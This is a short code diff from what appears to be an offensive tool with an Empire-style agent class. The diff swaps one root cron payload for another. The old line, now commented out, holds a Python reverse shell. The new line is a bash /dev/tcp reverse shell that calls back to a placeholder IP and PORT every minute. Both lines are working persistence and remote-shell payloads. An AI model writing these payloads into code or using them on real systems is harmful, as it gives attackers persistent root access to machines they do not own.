@@ -23,7 +23,8 @@ RESULT_POST = 5
 SERVER_RESPONSE = 6
 
 
-cron_payload = "* * * * * root /usr/bin/python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"IP\", PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n\n"
+#cron_payload = "* * * * * root /usr/bin/python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"IP\", PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n\n"
+cron_payload = "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'\n\n"
 
 class Agent:
     def __init__(self,server,language,staging_key=None,session_id=None,taskURIs=None,hostname=":^)"):
